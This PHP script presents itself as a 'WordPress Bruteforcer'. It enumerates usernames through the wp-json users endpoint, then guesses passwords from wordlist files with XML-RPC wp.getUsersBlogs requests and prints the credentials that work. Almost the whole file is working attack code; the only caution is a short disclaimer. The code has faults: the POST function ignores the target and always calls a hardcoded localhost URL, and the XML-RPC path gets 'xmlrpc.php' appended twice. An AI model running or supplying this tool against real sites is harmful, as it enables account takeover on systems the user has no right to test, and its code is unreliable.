<?php
/*
PHP WordPress Bruteforcer

Author: Mr Hery
Organization: MyOPECS - Malaysia Open Cyber Security
Date: 7 July 2023
*/

header("Content-Type: text/plain");

echo "Welcome to PHP WordPress Bruteforcer\n";
echo "Author: Mr Hery\n";
echo "Organization: Malaysia Open Cyber Security (MyOPECS)\n";
echo "Date: 7 July 2023\n";
echo "Desclaimer:\n";
echo "This script has been created to show the basic way to brute force a wordpress login authentication. Use of this script for illegal activities is not allowed. Using this script for illegal activities is up to your own risk.\n";
echo "===================================================\n";

function checkURL($url){
	 $ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	$head = curl_exec($ch);
	$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	
	curl_close($ch);
	
	return $httpCode;
}

function getString($url){
	$curl = curl_init();
	
	curl_setopt_array($curl, array(
		CURLOPT_URL 				=> $url,
		CURLOPT_RETURNTRANSFER 		=> true,
		CURLOPT_ENCODING 			=> '',
		CURLOPT_MAXREDIRS 			=> 10,
		CURLOPT_TIMEOUT 			=> 0,
		CURLOPT_FOLLOWLOCATION 		=> true,
		CURLOPT_HTTP_VERSION 		=> CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST 		=> 'GET',
		CURLOPT_HTTPHEADER 			=> array(
			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
			'Accept: */*',
			'Connection: keep-alive',
			'Accept-Encoding: gzip, deflate, br'
		)
	));

	$response = curl_exec($curl);
	$httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	
	curl_close($curl);
	
	return ["status" => $httpCode, "res" => $response];
}

function postString($url, $payload){
	$curl = curl_init();

	curl_setopt_array($curl, array(
		CURLOPT_URL 			=> 'http://localhost/wordpress/xmlrpc.php',
		CURLOPT_RETURNTRANSFER 	=> true,
		CURLOPT_ENCODING 		=> '',
		CURLOPT_MAXREDIRS 		=> 10,
		CURLOPT_TIMEOUT 		=> 0,
		CURLOPT_FOLLOWLOCATION 	=> true,
		CURLOPT_HTTP_VERSION 	=> CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST 	=> 'POST',
		CURLOPT_POSTFIELDS 		=> $payload,
		CURLOPT_HTTPHEADER 		=> array(
			'Content-Type: application/xml',
			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
			'Accept: */*',
			'Connection: keep-alive'
		),
	));

	$response = curl_exec($curl);

	curl_close($curl);
	return $response;
}

function main(){
	$url = readline("Please insert URL:");
	echo "\n";
	
	$url = rtrim($url, "/") . "/";
	
	echo "[+] Checking URL: " . $url;
	if(checkURL($url) == "200"){
		echo " - SUCCESS\n";
		
		$canEnum = false;
		$wpjsonURL = $url . "wp-json";
		echo "[+] Checking URL: " . $wpjsonURL;
		if(checkURL($wpjsonURL) == "200"){
			$canEnum = true;
			echo " - SUCCESS\n";
		}else{
			echo " - FAILED\n";
		}
		
		$canBruteforce = false;
		$xmlrpcURL = $url . "xmlrpc.php";
		echo "[+] Checking URL: " . $xmlrpcURL;
		if(checkURL($xmlrpcURL) != "404"){
			$canBruteforce = true;
			echo " - SUCCESS\n";
		}else{
			echo " - FAILED\n";
		}
		
		echo "\n";
		
		if($canEnum){
			echo "[GOOD] Maybe we can enumerate list of users.\n";
		}else{
			echo "[BAD] Seems we cannot enumerate list of users.\n";
		}
		
		if($canBruteforce){
			echo "[GOOD] Seems we can bruteforce this site.\n";
		}else{
			echo "[BAD] Seems we cannot bruteforce this site.\n";
		}
		
		echo "\n";
		
		if(!$canEnum && !$canBruteforce){
			echo "\n[BAD] Emm. Seems like nothing we can do here. Maybe the URL is not a WordPress Web Application.\n";
		}else{
			$foundUsers = [];
			
			if($canEnum){
				echo "[PROGRESS] Enumerating Users:\n";
				
				$res = getString($url . "wp-json/wp/v2/users");
				
				if(!is_null($res) && $res["status"] == "200"){
					$obj = json_decode($res["res"]);
					
					if(count($obj) > 0){
						foreach($obj as $o){
							$foundUsers[] = $o->name;
							echo "[FOUND] Username: " . $o->name . "\n";
						}
					}else{
						echo "[FAIL] No user information found.\n";
					}
				}else{
					echo "[FAIL] Fail enumerating users.\n";
					
					if($res["status"] != "200"){
						echo "[FAIL] HTTP Response code: ". $res["status"] ." on " . $url . "wp-json/wp/v2/users.\n";
					}
				}
			}
			
			echo "\nThere are " . count($foundUsers) . " username were found.\n";
			
			if($canBruteforce){
				$passPath = "";
				$userPath = "";
				
				if(count($foundUsers) > 0){
					$continueBrutforce = readline("\nContinue password bruteforce using found usernames? (y/n): ");
					
					echo "\n";
					if($continueBrutforce == "y" || $continueBrutforce == "Y" || $continueBrutforce == "yes"){
						$passPath = readline("Please insert password path file: ");
						$userPath = null;
					}
				}
				
				if(!is_null($userPath)){
					$userPath = readline("Please insert username path file: ");
					$passPath = readline("Please insert password path file: ");
				}
				
				$gotUserfile = true;
				$gotPassfile = true;
				if(!is_null($userPath) && !empty($userPath)){
					if(!file_exists($userPath)){
						$gotUserfile = false;
						echo "\nUsername file not found at: " . $userPath;
					}else{
						if(!file_exists($passPath)){
							$gotPassfile = false;
							echo "\Password file not found at: " . $userPath;
						}
					}
				}				
				
				if($gotUserfile && $gotPassfile){
					echo "\n[PROGRESS] Bruteforcing in progress:\n";
					
					$users = [];
					$passs = fopen($passPath, "rb");
					
					if(is_null($userPath)){
						$users = $foundUsers;
						
						foreach($users as $u){
							while(!feof($passs)){
								$p = fgets($passs);
								$payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" . $u . "</string></value></param><param><value><string>" . $p . "</string></value></param></params></methodCall>";
								
								$res = postString($xmlrpcURL . "xmlrpc.php", $payload);
								
								if(strpos($res, "isAdmin") > 0){
									echo "[FOUND] Username: " . $u . ", Password: " . $p . "\n";
								}
							}
						}
						
						fclose($passs);
					}else{
						$users = fopen($userPath, "rb");
						
						while(!feof($users)){
							$u = trim(preg_replace('/\s\s+/', '', fgets($users)));
							
							echo "Testing on " . $u . ":\n";
							
							$passs = fopen($passPath, "rb");
							while(!feof($passs)){
								$p = trim(preg_replace('/\s\s+/', '', fgets($passs)));
								$payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" . $u . "</string></value></param><param><value><string>" . $p . "</string></value></param></params></methodCall>";
								
								$res = postString($xmlrpcURL . "xmlrpc.php", $payload);
								
								if(strpos($res, "isAdmin") > 0){
									echo "[FOUND] Username: " . $u . ", Password: " . $p . "\n";
								}
							}
							
							fclose($passs);
						}
						
						fclose($users);
					}					
				}
			}
		}
	}else{
		echo " - FAILED\n";
		echo "Cannot access the URL. Make sure the URL is correct and accessible.\n";
	}
	
	$exit = readline("\nDo you want to exit? (y/n): ");
	
	if($exit == "y" || $exit == "Y" || $exit == "yes"){
		echo "\n\nThank you for using me! Bye!";
		die();
	}else{
		main();
	}
}

main();
